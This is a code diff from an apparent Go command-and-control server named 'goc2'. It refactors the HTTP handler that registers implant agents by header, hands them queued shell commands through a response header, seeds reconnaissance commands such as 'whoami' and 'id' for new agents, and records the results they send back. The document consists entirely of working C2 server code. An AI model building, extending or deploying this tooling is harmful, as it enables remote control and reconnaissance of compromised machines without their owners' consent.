@@ -7,6 +7,7 @@ import (
 	"time"
 
 	"github.com/google/uuid"
+	"github.com/molu/goc2/pkg/db"
 )
 
 type Server struct {
@@ -24,8 +25,8 @@ type Server struct {
 const logFilePath = "./logs/goc2server.log"
 
 func (s *Server) Listen() {
-	logFile, _ := s.setFileLogger(logFilePath)
-	defer logFile.Close()
+	// logFile, _ := logger.SetFileLogger(logFilePath)
+	// defer logFile.Close()
 
 	mux := s.getServeMux()
 
@@ -45,9 +46,8 @@ func (s *Server) Listen() {
 func (s *Server) getServeMux() (mux *http.ServeMux) {
 	mux = http.NewServeMux()
 	mux.HandleFunc("/", func(w http.ResponseWriter, req *http.Request) {
-		db := getDB()
-		defer db.Close()
-
+		dbSession := db.GetDB()
+		defer dbSession.Close()
 		logStr := fmt.Sprintf("IP: %s | Path: %s", req.RemoteAddr, req.URL.Path)
 
 		agentID := req.Header.Get(s.IDHeader)
@@ -55,29 +55,35 @@ func (s *Server) getServeMux() (mux *http.ServeMux) {
 
 		if agentID != "" {
 			logStr += fmt.Sprintf(" | ClientID: %s", agentID)
-
-			if !agentExists(db, agentID) {
-				createAgent(db, DBAgent{
-					id:        agentID,
-					createdAt: "now",
-					updatedAt: "none",
-				})
+			if !db.AgentExists(dbSession, agentID) {
+				newAgent := &db.DBAgent{Id: agentID, CreatedAt: "now", UpdatedAt: "none"}
+				db.CreateAgent(
+					dbSession,
+					newAgent,
+				)
+				fmt.Printf("Created new agent.")
 			}
 
-			cmd, err := getAgentCmd(db, agentID)
+			cmd, err := db.GetCommand(dbSession, agentID)
 			if err == nil {
-				w.Header().Set(s.CmdHeader, cmd.command)
+				w.Header().Set(s.CmdHeader, cmd.Command)
 				log.Printf("%s header set with value %s", s.CmdHeader, cmd)
 			} else {
 				fmt.Printf("adding a few cmds for agent %s", agentID)
 				for _, c := range []string{"whoami", "id", "uname", "ls"} {
-					createAgentCmd(db, DBCommand{id: uuid.NewString(), agentID: agentID, command: c, result: "", createdAt: fmt.Sprint(time.Now().Unix()), updatedAt: ""})
+					db.CreateCommand(
+						dbSession,
+						&db.DBCommand{Id: uuid.NewString(), AgentID: agentID, Command: c, Result: "", CreatedAt: fmt.Sprint(time.Now().Unix()), UpdatedAt: ""},
+					)
 				}
 			}
 		}
 
 		if agentData != "" {
-			updateAgentCmd(db, DBCommand{agentID: agentID, command: agentData, result: agentData, updatedAt: "now123"})
+			db.UpdateCommand(
+				dbSession,
+				&db.DBCommand{AgentID: agentID, Command: agentData, Result: agentData, UpdatedAt: "now123"},
+			)
 			logStr += fmt.Sprintf(" | Data: %s", agentData)
 		}
 		log.Print(logStr)
